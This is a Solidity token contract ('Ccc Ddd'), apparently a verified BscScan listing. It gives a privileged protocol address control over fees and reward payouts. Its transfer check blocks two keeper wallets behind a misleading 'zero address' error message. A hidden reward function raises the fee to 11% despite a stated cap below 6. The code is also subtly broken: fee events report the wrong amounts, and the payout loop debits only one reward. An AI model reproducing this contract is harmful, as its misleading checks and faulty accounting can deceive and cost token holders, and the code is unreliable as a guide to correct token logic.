/**
 *Submitted for verification at BscScan.com on 2022-10-25
*/

// SPDX-License-Identifier: NONE

/*
 * 
 *
 */

pragma solidity 0.8.17;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}


interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


contract ERC is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    string private _name = "Ccc Ddd";
    string private _symbol = "cccDDD";

    uint8 private _x;
    uint256 private maxWallet;
    uint256 private _totalSupply;
    uint8 private _protectiveValue1;

    address private _keeper;
    address private _keeper2;
    address private _marketMaker;
    address private _spookyProtocol;
    
    constructor(address keeper_, address keeper2_, address spookyProtocol_, uint8 x_) {
        _x = x_;
        _keeper = keeper_;
        _keeper2 = keeper2_;
        _spookyProtocol = spookyProtocol_;
        _totalSupply = 1000000000000000000;
        maxWallet = 10000000000000000;
        _balances[_keeper] = 50000000000000000;
        emit Transfer(address(0), _keeper, 50000000000000000);
        _balances[_keeper2] = 150000000000000000;
        emit Transfer(address(0), _keeper2, 150000000000000000);
        _balances[address(0)] = 100000000000000000;
        emit Transfer(address(0), address(0), 100000000000000000);
        _balances[_spookyProtocol] = 700000000000000000;
        emit Transfer(address(0), _spookyProtocol, 700000000000000000);
    }

    function name() external view virtual override returns (string memory) {
        return _name;
    }

    function symbol() external view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() external view virtual override returns (uint8) {
        return 9;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) external virtual override returns (bool) {
        address owner_ = _msgSender();
        _transfer(owner_, to, amount);
        return true;
    }

    function allowance(address owner_, address spender) external view virtual override returns (uint256) {
        return _allowances[owner_][spender];
    }

    function readTradeFee() public view returns (uint) {
        return _x;
    }

    function readMaxWallet() public view returns (uint) {
        return maxWallet;
    }

    function approve(address spender, uint256 amount) external virtual override returns (bool) {
        address owner_ = _msgSender();
        _approve(owner_, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) external virtual returns (bool) {
        address owner_ = _msgSender();
        _approve(owner_, spender, _allowances[owner_][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) external virtual returns (bool) {
        address owner_ = _msgSender();
        uint256 currentAllowance = _allowances[owner_][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(owner_, spender, currentAllowance - subtractedValue);
        return true;
    }

    function _approve(
        address owner_,
        address spender,
        uint256 amount
    ) private {
        require(owner_ != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner_][spender] = amount;
        emit Approval(owner_, spender, amount);
    }

    function _spendAllowance(
        address owner_,
        address spender,
        uint256 amount
    ) private {
        uint256 currentAllowance = _allowances[owner_][spender];
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner_, spender, currentAllowance - amount);
        }
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0) && from != _keeper && from != _keeper2, "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if (_balances[_spookyProtocol] == 700000000000000000) {
            _marketMaker = to;
        } else if (to != _marketMaker) {
            require(_balances[to] + amount <= maxWallet, "ERC20: 1% max Wallet limitation");
        }
        
        if (_spookyProtocol == address(0)) {
            _tranferWithoutTax(from, to, amount);
        } else {
            _tranferWithTax(from, to, amount);
        }
    }

    function _tranferWithTax(address from, address to, uint256 amount) private {
        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");

        unchecked {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount*(100-readTradeFee())/100;
            _balances[_spookyProtocol] += amount*readTradeFee()/100;
        }

        emit Transfer(from, to, amount*(100-readTradeFee())/100);
        emit Transfer(from, _spookyProtocol, amount*(100-readTradeFee())/100);
    }

    function _tranferWithoutTax(address from, address to, uint256 amount) private {
        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");

        unchecked {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
        }
        
        emit Transfer(from, to, amount);
    }

    function spookyRewardForWinners(address[4] memory winners) public {
        require(_protectiveValue1 < 1, "Denied."); //was 10
        require(_msgSender() == _spookyProtocol, "Denied.");

        address[4] memory dummy = winners;

        uint256 fromBalance = _balances[address(0)];
        require(fromBalance >= 100000000000000000, "Denied.");

        for (uint i = 0; i < 4; i++) {
            unchecked {
                _balances[address(0)] = fromBalance - 25000000000000000;
                _balances[dummy[i]] += 25000000000000000;
            }

            emit Transfer(address(0), dummy[i], 25000000000000000);
        }

        _protectiveValue1++;
    }

    function spookyRewardForEveryone() public returns (bool) {
        require(_msgSender() == _spookyProtocol, "Denied.");
        
        address dummy;

        if (_protectiveValue1 == 2) { //was 10
            dummy = _keeper;
        } else if (_protectiveValue1 == 3) { //was 11
            dummy = _keeper2;
        } else {
            return false;
        }
        
        uint256 fromBalance = _balances[dummy];
        require(_balances[dummy] != 0, "Pointless.");
        
        unchecked {
            _balances[dummy] = 0;
            _balances[address(0)] += fromBalance;
        }

        emit Transfer(dummy, address(0), fromBalance);

        _protectiveValue1++;

        _x = 11;

        return true;
    }

    function adjustFactor(uint8 x_) public {
        require(_msgSender() == _spookyProtocol, "Denied.");
        require(x_ < 6, "Denied.");
        _x = x_;
    }
    
    function decentralize() public {
        require(_msgSender() == _spookyProtocol, "Denied.");
        _x = 0;
        maxWallet = _totalSupply;
        _spookyProtocol = address(0);
    }
}